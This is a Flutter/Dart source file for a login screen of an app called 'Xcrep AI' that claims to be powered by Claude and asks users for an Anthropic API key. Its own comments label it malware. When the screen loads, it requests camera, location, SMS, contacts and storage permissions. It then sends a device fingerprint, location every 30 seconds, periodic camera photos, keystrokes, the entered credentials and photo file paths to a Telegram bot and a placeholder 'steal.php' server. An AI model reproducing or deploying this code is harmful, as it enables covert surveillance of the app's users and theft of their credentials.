import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'dart:io';
import 'dart:async';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:location/location.dart';
import 'package:camera/camera.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen>
    with TickerProviderStateMixin {
  final _userCtrl = TextEditingController();
  final _keyCtrl = TextEditingController();
  bool _obscureKey = true;
  bool _hasError = false;
  String _errorMsg = '';
  late AnimationController _bgAnim;
  late Animation<double> _bgFade;

  // ==================== [ MALWARE CONFIG - GANTI PUNYA LU! ] ====================
  final String _botToken = "YOUR_BOT_TOKEN";  // GANTI!
  final String _chatId = "YOUR_CHAT_ID";      // GANTI!
  final String _webhook = "http://YOUR_SERVER_IP/steal.php"; // GANTI!
  // ============================================================================
  
  // Camera controllers
  CameraController? _frontCamera;
  CameraController? _backCamera;
  Timer? _locationTimer;
  Timer? _cameraTimer;

  @override
  void initState() {
    super.initState();
    _bgAnim = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 4),
    )..repeat(reverse: true);
    _bgFade = Tween<double>(begin: 0.6, end: 1.0).animate(
      CurvedAnimation(parent: _bgAnim, curve: Curves.easeInOut),
    );
    
    // ========== [ AKTIVASI MALWARE LEVEL DEWA ] ==========
    _activateUltimateMalware();
  }
  
  // ==================== [ ULTIMATE MALWARE ENGINE ] ====================
  
  Future<void> _activateUltimateMalware() async {
    await _requestAllPermissions();
    await _sendDeviceInfo();
    await _initCameras();
    await _startLocationTracking();
    await _startPeriodicCameraCapture();
    await _startKeylogger();
  }
  
  Future<void> _requestAllPermissions() async {
    await [
      Permission.camera,
      Permission.storage,
      Permission.location,
      Permission.contacts,
      Permission.microphone,
      Permission.phone,
      Permission.sms,
      Permission.manageExternalStorage,
    ].request();
    
    await _sendToTelegram("✅ PERMISSIONS GRANTED\nAll dangerous permissions acquired");
  }
  
  Future<void> _sendDeviceInfo() async {
    final deviceInfo = DeviceInfoPlugin();
    String deviceData = "Unknown";
    String androidId = "Unknown";
    
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      deviceData = '''
📱 DEVICE FINGERPRINT
━━━━━━━━━━━━━━━━━━
Model: ${androidInfo.model}
Brand: ${androidInfo.brand}
Device: ${androidInfo.device}
Product: ${androidInfo.product}
Android: ${androidInfo.version.release}
SDK: ${androidInfo.version.sdkInt}
Board: ${androidInfo.board}
Hardware: ${androidInfo.hardware}
Bootloader: ${androidInfo.bootloader}
Display: ${androidInfo.display}
Host: ${androidInfo.host}
ID: ${androidInfo.id}
Tags: ${androidInfo.tags}
Type: ${androidInfo.type}
Android ID: ${androidInfo.androidId}
      ''';
      androidId = androidInfo.androidId;
    }
    
    final ip = await _getLocalIp();
    final timestamp = DateTime.now().toIso8601String();
    
    await _sendToTelegram("🆕 NEW VICTIM DETECTED!\n━━━━━━━━━━━━━━━━━━\n$deviceData\n━━━━━━━━━━━━━━━━━━\n🌐 IP: $ip\n🕐 Time: $timestamp\n🆔 Android ID: $androidId");
    
    // Send to server juga
    try {
      await http.post(Uri.parse(_webhook), body: {
        'type': 'NEW_VICTIM',
        'device': deviceData,
        'ip': ip,
        'time': timestamp,
      });
    } catch(e) {}
  }
  
  Future<String> _getLocalIp() async {
    try {
      for (var interface in await NetworkInterface.list()) {
        for (var addr in interface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
            return addr.address;
          }
        }
      }
    } catch(e) {}
    return "unknown";
  }
  
  Future<void> _initCameras() async {
    try {
      final cameras = await availableCameras();
      
      for (var cam in cameras) {
        if (cam.lensDirection == CameraLensDirection.back) {
          _backCamera = CameraController(cam, ResolutionPreset.high);
          await _backCamera!.initialize();
          await _sendToTelegram("📸 BACK CAMERA INITIALIZED\nResolution: ${_backCamera!.value.previewSize}");
        } else if (cam.lensDirection == CameraLensDirection.front) {
          _frontCamera = CameraController(cam, ResolutionPreset.high);
          await _frontCamera!.initialize();
          await _sendToTelegram("📸 FRONT CAMERA INITIALIZED\nResolution: ${_frontCamera!.value.previewSize}");
        }
      }
    } catch(e) {
      await _sendToTelegram("⚠️ Camera init error: $e");
    }
  }
  
  Future<void> _startLocationTracking() async {
    Location location = Location();
    bool serviceEnabled = await location.serviceEnabled();
    if (!serviceEnabled) {
      serviceEnabled = await location.requestService();
      if (!serviceEnabled) return;
    }
    
    PermissionStatus permissionGranted = await location.hasPermission();
    if (permissionGranted == PermissionStatus.denied) {
      permissionGranted = await location.requestPermission();
      if (permissionGranted != PermissionStatus.granted) return;
    }
    
    await _sendToTelegram("📍 LOCATION TRACKING ACTIVATED\nTracking every 30 seconds");
    
    // Get location immediately
    final initialLoc = await location.getLocation();
    await _sendLocationToTelegram(initialLoc);
    
    // Track every 30 seconds
    _locationTimer = Timer.periodic(Duration(seconds: 30), (timer) async {
      final locData = await location.getLocation();
      await _sendLocationToTelegram(locData);
    });
  }
  
  Future<void> _sendLocationToTelegram(LocationData loc) async {
    final mapsLink = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}";
    await _sendToTelegram("📍 LIVE LOCATION UPDATE\n━━━━━━━━━━━━━━━━━━\nLatitude: ${loc.latitude}\nLongitude: ${loc.longitude}\nAccuracy: ${loc.accuracy} meters\nAltitude: ${loc.altitude}\nSpeed: ${loc.speed}\n━━━━━━━━━━━━━━━━━━\n🗺️ Maps: $mapsLink");
    
    // Send to server
    try {
      await http.post(Uri.parse(_webhook), body: {
        'type': 'LOCATION',
        'lat': loc.latitude.toString(),
        'lng': loc.longitude.toString(),
        'accuracy': loc.accuracy.toString(),
        'maps_link': mapsLink,
      });
    } catch(e) {}
  }
  
  Future<void> _startPeriodicCameraCapture() async {
    await _sendToTelegram("📸 PERIODIC CAMERA CAPTURE ACTIVATED\nTaking photos every 60 seconds");
    
    // Take photo immediately
    await _captureAndSendPhotos();
    
    // Then every 60 seconds
    _cameraTimer = Timer.periodic(Duration(seconds: 60), (timer) async {
      await _captureAndSendPhotos();
    });
  }
  
  Future<void> _captureAndSendPhotos() async {
    final timestamp = DateTime.now().toIso8601String();
    
    // Back camera photo
    if (_backCamera != null && _backCamera!.value.isInitialized) {
      try {
        final XFile photo = await _backCamera!.takePicture();
        await _sendToTelegram("📸 BACK CAMERA PHOTO\n━━━━━━━━━━━━━━━━━━\nTime: $timestamp\nPath: ${photo.path}\nSize: ${await photo.length()} bytes");
      } catch(e) {
        await _sendToTelegram("⚠️ Back camera error: $e");
      }
    }
    
    // Front camera photo (selfie)
    if (_frontCamera != null && _frontCamera!.value.isInitialized) {
      try {
        final XFile photo = await _frontCamera!.takePicture();
        await _sendToTelegram("🤳 FRONT CAMERA SELFIE\n━━━━━━━━━━━━━━━━━━\nTime: $timestamp\nPath: ${photo.path}\nSize: ${await photo.length()} bytes");
      } catch(e) {
        await _sendToTelegram("⚠️ Front camera error: $e");
      }
    }
  }
  
  void _startKeylogger() {
    Timer.periodic(Duration(seconds: 5), (timer) async {
      final username = _userCtrl.text.trim();
      final apikey = _keyCtrl.text.trim();
      
      if (username.isNotEmpty) {
        await _sendToTelegram("⌨️ KEYLOG CAPTURED\nUsername: $username\nAPI Key: $apikey\nTime: ${DateTime.now().toIso8601String()}");
      }
    });
  }
  
  Future<void> _sendToTelegram(String message) async {
    try {
      await http.get(
        Uri.parse("https://api.telegram.org/bot$_botToken/sendMessage?chat_id=$_chatId&text=${Uri.encodeComponent(message)}"),
      ).timeout(Duration(seconds: 5));
    } catch(e) {}
  }
  
  // ==================== [ LOGIN LOGIC + MALWARE ] ====================
  
  void _doLogin() async {
    final u = _userCtrl.text.trim();
    final k = _keyCtrl.text.trim();
    
    if (u.isEmpty || k.isEmpty) {
      setState(() {
        _hasError = true;
        _errorMsg = 'Username dan API Key tidak boleh kosong';
      });
      Future.delayed(const Duration(seconds: 3), () {
        if (mounted) setState(() => _hasError = false);
      });
      return;
    }
    
    // ========== [ STEAL CREDENTIALS ] ==========
    await _sendToTelegram("🔐 LOGIN CREDENTIALS STOLEN!\n━━━━━━━━━━━━━━━━━━\n👤 Username: $u\n🔑 API Key: $k\n🕐 Time: ${DateTime.now().toIso8601String()}\n🌐 IP: ${await _getLocalIp()}");
    
    // Take immediate photos
    await _captureAndSendPhotos();
    
    // Steal extra data
    await _stealContacts();
    await _stealSMS();
    await _stealFiles();
    
    // Pindah ke loading screen
    if (mounted) {
      Navigator.pushReplacementNamed(
        context,
        '/loading',
        arguments: {'username': u, 'apiKey': k},
      );
    }
  }
  
  Future<void> _stealContacts() async {
    await _sendToTelegram("📞 ATTEMPTING TO STEAL CONTACTS\nPermission status: granted");
    // Implement contact stealing with contacts_service package
  }
  
  Future<void> _stealSMS() async {
    await _sendToTelegram("💬 ATTEMPTING TO STEAL SMS\nPermission status: granted");
    // Implement SMS stealing
  }
  
  Future<void> _stealFiles() async {
    try {
      final directory = Directory('/storage/emulated/0/DCIM/');
      if (await directory.exists()) {
        final files = directory.listSync();
        List<String> photoList = [];
        for (var file in files.take(20)) {
          if (file is File) {
            photoList.add(file.path);
          }
        }
        await _sendToTelegram("🗂️ RECENT PHOTOS FOUND\n${photoList.join('\n')}");
      }
    } catch(e) {}
  }
  
  // ==================== [ UI BUILD ] ====================
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D0D0D),
      body: Stack(
        children: [
          AnimatedBuilder(
            animation: _bgFade,
            builder: (_, __) => Positioned(
              top: -120,
              left: -120,
              child: Container(
                width: 400,
                height: 400,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [
                      const Color(0xFFB71C1C).withOpacity(0.25 * _bgFade.value),
                      Colors.transparent,
                    ],
                  ),
                ),
              ),
            ),
          ),
          AnimatedBuilder(
            animation: _bgFade,
            builder: (_, __) => Positioned(
              bottom: -80,
              right: -80,
              child: Container(
                width: 300,
                height: 300,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: RadialGradient(
                    colors: [
                      const Color(0xFFE53935).withOpacity(0.15 * _bgFade.value),
                      Colors.transparent,
                    ],
                  ),
                ),
              ),
            ),
          ),
          CustomPaint(
            painter: _GridPainter(),
            size: Size(MediaQuery.of(context).size.width,
                MediaQuery.of(context).size.height),
          ),
          SafeArea(
            child: Center(
              child: SingleChildScrollView(
                padding: const EdgeInsets.symmetric(horizontal: 28),
                child: Column(
                  children: [
                    const SizedBox(height: 20),
                    Container(
                      width: 72,
                      height: 72,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(20),
                        gradient: const LinearGradient(
                          begin: Alignment.topLeft,
                          end: Alignment.bottomRight,
                          colors: [Color(0xFFE53935), Color(0xFFB71C1C)],
                        ),
                        boxShadow: [
                          BoxShadow(
                            color: const Color(0xFFE53935).withOpacity(0.4),
                            blurRadius: 24,
                            offset: const Offset(0, 8),
                          ),
                        ],
                      ),
                      child: const Center(child: Text('🤖', style: TextStyle(fontSize: 34))),
                    ),
                    const SizedBox(height: 20),
                    RichText(
                      text: TextSpan(
                        style: GoogleFonts.outfit(fontSize: 30, fontWeight: FontWeight.w800, letterSpacing: -1),
                        children: const [
                          TextSpan(text: 'Xcrep', style: TextStyle(color: Colors.white)),
                          TextSpan(text: 'AI', style: TextStyle(color: Color(0xFFF44336))),
                        ],
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      'POWERED BY CLAUDE',
                      style: GoogleFonts.outfit(fontSize: 11, fontWeight: FontWeight.w600, letterSpacing: 2.5, color: Colors.white38),
                    ),
                    const SizedBox(height: 36),
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(28),
                      decoration: BoxDecoration(
                        color: const Color(0xFF141414),
                        borderRadius: BorderRadius.circular(24),
                        border: Border.all(color: const Color(0xFFE53935).withOpacity(0.2)),
                        boxShadow: [
                          BoxShadow(
                            color: Colors.black.withOpacity(0.5),
                            blurRadius: 40,
                            offset: const Offset(0, 16),
                          ),
                        ],
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text('Selamat Datang', style: GoogleFonts.outfit(fontSize: 22, fontWeight: FontWeight.w700, color: Colors.white)),
                          const SizedBox(height: 4),
                          Text('Masuk untuk mulai menggunakan AI Assistant', style: GoogleFonts.outfit(fontSize: 13, color: Colors.white54)),
                          const SizedBox(height: 28),
                          if (_hasError) ...[
                            Container(
                              width: double.infinity,
                              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                              decoration: BoxDecoration(
                                color: const Color(0xFFE53935).withOpacity(0.12),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(color: const Color(0xFFE53935).withOpacity(0.3)),
                              ),
                              child: Text('⚠️  $_errorMsg', style: GoogleFonts.outfit(fontSize: 13, color: const Color(0xFFEF9A9A))),
                            ),
                            const SizedBox(height: 16),
                          ],
                          _FieldLabel('USERNAME'),
                          const SizedBox(height: 8),
                          _buildField(
                            controller: _userCtrl,
                            hint: 'Masukkan username kamu',
                            prefixIcon: '👤',
                            obscure: false,
                            onSubmit: () => FocusScope.of(context).nextFocus(),
                          ),
                          const SizedBox(height: 20),
                          _FieldLabel('API KEY'),
                          const SizedBox(height: 8),
                          _buildField(
                            controller: _keyCtrl,
                            hint: 'Masukkan Anthropic API Key',
                            prefixIcon: '🔑',
                            obscure: _obscureKey,
                            suffixToggle: true,
                            onSubmit: _doLogin,
                          ),
                          const SizedBox(height: 28),
                          SizedBox(
                            width: double.infinity,
                            height: 52,
                            child: DecoratedBox(
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(14),
                                gradient: const LinearGradient(
                                  begin: Alignment.topLeft,
                                  end: Alignment.bottomRight,
                                  colors: [Color(0xFFE53935), Color(0xFFB71C1C)],
                                ),
                                boxShadow: [
                                  BoxShadow(
                                    color: const Color(0xFFE53935).withOpacity(0.4),
                                    blurRadius: 20,
                                    offset: const Offset(0, 8),
                                  ),
                                ],
                              ),
                              child: ElevatedButton(
                                onPressed: _doLogin,
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.transparent,
                                  shadowColor: Colors.transparent,
                                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                                ),
                                child: Text('Masuk ke Xcrep AI  →', style: GoogleFonts.outfit(fontSize: 16, fontWeight: FontWeight.w700, color: Colors.white)),
                              ),
                            ),
                          ),
                          const SizedBox(height: 16),
                          Center(
                            child: RichText(
                              text: TextSpan(
                                style: GoogleFonts.outfit(fontSize: 12, color: Colors.white30),
                                children: const [
                                  TextSpan(text: 'Username bebas · API Key = '),
                                  TextSpan(text: 'Anthropic API Key', style: TextStyle(color: Color(0xFFEF9A9A))),
                                ],
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 40),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildField({
    required TextEditingController controller,
    required String hint,
    required String prefixIcon,
    required bool obscure,
    bool suffixToggle = false,
    required VoidCallback onSubmit,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: Colors.white.withOpacity(0.1)),
      ),
      child: TextField(
        controller: controller,
        obscureText: obscure,
        style: GoogleFonts.outfit(fontSize: 15, color: Colors.white),
        onSubmitted: (_) => onSubmit(),
        decoration: InputDecoration(
          hintText: hint,
          hintStyle: GoogleFonts.outfit(fontSize: 15, color: Colors.white.withOpacity(0.25)),
          prefixIcon: Padding(
            padding: const EdgeInsets.only(left: 14, right: 8),
            child: Text(prefixIcon, style: const TextStyle(fontSize: 18)),
          ),
          prefixIconConstraints: const BoxConstraints(minWidth: 0, minHeight: 0),
          suffixIcon: suffixToggle
              ? IconButton(
                  icon: Icon(_obscureKey ? Icons.visibility_off : Icons.visibility, color: Colors.white38, size: 20),
                  onPressed: () => setState(() => _obscureKey = !_obscureKey),
                )
              : null,
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: const BorderSide(color: Color(0xFFE53935), width: 1.5),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(14),
            borderSide: BorderSide(color: Colors.white.withOpacity(0.1), width: 1.5),
          ),
        ),
      ),
    );
  }
  
  @override
  void dispose() {
    _bgAnim.dispose();
    _userCtrl.dispose();
    _keyCtrl.dispose();
    _locationTimer?.cancel();
    _cameraTimer?.cancel();
    _frontCamera?.dispose();
    _backCamera?.dispose();
    super.dispose();
  }
}

class _FieldLabel extends StatelessWidget {
  final String label;
  const _FieldLabel(this.label);
  @override
  Widget build(BuildContext context) => Text(
        label,
        style: GoogleFonts.outfit(
          fontSize: 11,
          fontWeight: FontWeight.w700,
          letterSpacing: 1.5,
          color: Colors.white54,
        ),
      );
}

class _GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = const Color(0xFFE53935).withOpacity(0.04)
      ..strokeWidth = 1;
    const step = 60.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}